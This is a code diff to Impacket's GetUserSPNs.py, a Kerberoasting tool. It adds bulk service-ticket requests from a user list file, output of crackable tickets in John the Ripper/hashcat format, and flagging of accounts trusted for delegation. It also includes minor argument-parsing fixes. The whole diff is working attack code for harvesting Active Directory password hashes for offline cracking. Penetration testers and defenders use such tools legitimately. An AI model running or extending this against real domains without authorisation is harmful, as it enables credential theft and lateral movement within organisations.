@@ -38,7 +38,7 @@ from binascii import hexlify, unhexlify
 
 from pyasn1.codec.der import decoder
 from impacket import version
-from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE
+from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_TRUSTED_FOR_DELEGATION, UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
 from impacket.examples import logger
 from impacket.krb5 import constants
 from impacket.krb5.asn1 import TGS_REP
@@ -75,6 +75,7 @@ class GetUserSPNs:
         self.__lmhash = ''
         self.__nthash = ''
         self.__outputFileName = cmdLineOptions.outputfile
+        self.__usersFile = cmdLineOptions.usersfile
         self.__aesKey = cmdLineOptions.aesKey
         self.__doKerberos = cmdLineOptions.k
         self.__requestTGS = cmdLineOptions.request
@@ -246,6 +247,10 @@ class GetUserSPNs:
                 logging.error(str(e))
 
     def run(self):
+        if self.__usersFile:
+            self.request_users_file_TGSs()
+            return
+
         if self.__doKerberos:
             target = self.getMachineName()
         else:
@@ -287,7 +292,7 @@ class GetUserSPNs:
             resp = ldapConnection.search(searchFilter=searchFilter,
                                          attributes=['servicePrincipalName', 'sAMAccountName',
                                                      'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
-                                         sizeLimit=999)
+                                         sizeLimit=100000)
         except ldap.LDAPSearchError as e:
             if e.getErrorString().find('sizeLimitExceeded') >= 0:
                 logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
@@ -311,6 +316,7 @@ class GetUserSPNs:
             pwdLastSet = ''
             userAccountControl = 0
             lastLogon = 'N/A'
+            delegation = ''
             try:
                 for attribute in item['attributes']:
                     if str(attribute['type']) == 'sAMAccountName':
@@ -318,6 +324,10 @@ class GetUserSPNs:
                         mustCommit = True
                     elif str(attribute['type']) == 'userAccountControl':
                         userAccountControl = str(attribute['vals'][0])
+                        if int(userAccountControl) & UF_TRUSTED_FOR_DELEGATION:
+                            delegation = 'unconstrained'
+                        elif int(userAccountControl) & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
+                            delegation = 'constrained'
                     elif str(attribute['type']) == 'memberOf':
                         memberOf = str(attribute['vals'][0])
                     elif str(attribute['type']) == 'pwdLastSet':
@@ -339,13 +349,13 @@ class GetUserSPNs:
                         logging.debug('Bypassing disabled account %s ' % sAMAccountName)
                     else:
                         for spn in SPNs:
-                            answers.append([spn, sAMAccountName,memberOf, pwdLastSet, lastLogon])
+                            answers.append([spn, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation])
             except Exception as e:
                 logging.error('Skipping item, cannot process due to error %s' % str(e))
                 pass
 
         if len(answers)>0:
-            self.printTable(answers, header=[ "ServicePrincipalName", "Name", "MemberOf", "PasswordLastSet", "LastLogon"])
+            self.printTable(answers, header=[ "ServicePrincipalName", "Name", "MemberOf", "PasswordLastSet", "LastLogon", "Delegation"])
             print('\n\n')
 
             if self.__requestTGS is True or self.__requestUser is not None:
@@ -354,27 +364,69 @@ class GetUserSPNs:
 
                 # Get a TGT for the current user
                 TGT = self.getTGT()
+
                 if self.__outputFileName is not None:
                     fd = open(self.__outputFileName, 'w+')
                 else:
                     fd = None
+
                 for user, SPN in users.items():
+                    sAMAccountName = user
+                    downLevelLogonName = self.__targetDomain + "\\" + sAMAccountName
+
                     try:
-                        serverName = Principal(SPN, type=constants.PrincipalNameType.NT_SRV_INST.value)
-                        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.__domain,
+                        principalName = Principal()
+                        principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
+                        principalName.components = [downLevelLogonName]
+
+                        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
                                                                                 self.__kdcHost,
                                                                                 TGT['KDC_REP'], TGT['cipher'],
                                                                                 TGT['sessionKey'])
-                        self.outputTGS(tgs, oldSessionKey, sessionKey, user, SPN, fd)
+                        self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName, self.__targetDomain + "/" + sAMAccountName, fd)
                     except Exception as e:
                         logging.debug("Exception:", exc_info=True)
-                        logging.error('SPN: %s - %s' % (SPN,str(e)))
+                        logging.error('Principal: %s - %s' % (downLevelLogonName, str(e)))
+
                 if fd is not None:
                     fd.close()
 
         else:
             print("No entries found!")
 
+    def request_users_file_TGSs(self):
+
+        with open(self.__usersFile) as fi:
+            usernames = [line.strip() for line in fi]
+
+        self.request_multiple_TGSs(usernames)
+
+    def request_multiple_TGSs(self, usernames):
+        # Get a TGT for the current user
+        TGT = self.getTGT()
+
+        if self.__outputFileName is not None:
+            fd = open(self.__outputFileName, 'w+')
+        else:
+            fd = None
+
+        for username in usernames:
+            try:
+                principalName = Principal()
+                principalName.type = constants.PrincipalNameType.NT_ENTERPRISE.value
+                principalName.components = [username]
+
+                tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
+                                                                        self.__kdcHost,
+                                                                        TGT['KDC_REP'], TGT['cipher'],
+                                                                        TGT['sessionKey'])
+                self.outputTGS(tgs, oldSessionKey, sessionKey, username, username, fd)
+            except Exception as e:
+                logging.debug("Exception:", exc_info=True)
+                logging.error('Principal: %s - %s' % (username, str(e)))
+
+        if fd is not None:
+            fd.close()
 
 # Process command-line arguments.
 if __name__ == '__main__':
@@ -388,12 +440,13 @@ if __name__ == '__main__':
     parser.add_argument('target', action='store', help='domain/username[:password]')
     parser.add_argument('-target-domain', action='store', help='Domain to query/request if different than the domain of the user. '
                                                                'Allows for Kerberoasting across trusts.')
-    parser.add_argument('-request', action='store_true', default='False', help='Requests TGS for users and output them '
-                                                                               'in JtR/hashcat format (default False)')
+    parser.add_argument('-usersfile', help='File with user per line to test')
+    parser.add_argument('-request', action='store_true', default=False, help='Requests TGS for users and output them '
+                                                                             'in JtR/hashcat format (default False)')
     parser.add_argument('-request-user', action='store', metavar='username', help='Requests TGS for the SPN associated '
                                                           'to the user specified (just the username, no domain needed)')
-    parser.add_argument('-save', action='store_true', default='False', help='Saves TGS requested to disk. Format is '
-                                                                            '<username>.ccache. Auto selects -request')
+    parser.add_argument('-save', action='store_true', default=False, help='Saves TGS requested to disk. Format is '
+                                                                          '<username>.ccache. Auto selects -request')
     parser.add_argument('-outputfile', action='store',
                         help='Output filename to write ciphers in JtR/hashcat format')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
@@ -421,21 +474,15 @@ if __name__ == '__main__':
 
     if options.debug is True:
         logging.getLogger().setLevel(logging.DEBUG)
+        # Print the Library's installation path
+        logging.debug(version.getInstallationPath())
     else:
         logging.getLogger().setLevel(logging.INFO)
 
     import re
-    # This is because I'm lazy with regex
-    # ToDo: We need to change the regex to fullfil domain/username[:password]
-    targetParam = options.target+'@'
-    userDomain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(targetParam).groups('')
+    userDomain, username, password = re.compile('(?:(?:([^/:]*)/)?([^:]*)(?::(.*))?)?').match(options.target).groups('')
 
-    #In case the password contains '@'
-    if '@' in address:
-        password = password + '@' + address.rpartition('@')[0]
-        address = address.rpartition('@')[2]
-
-    if userDomain is '':
+    if userDomain == '':
         logging.critical('userDomain should be specified!')
         sys.exit(1)
 
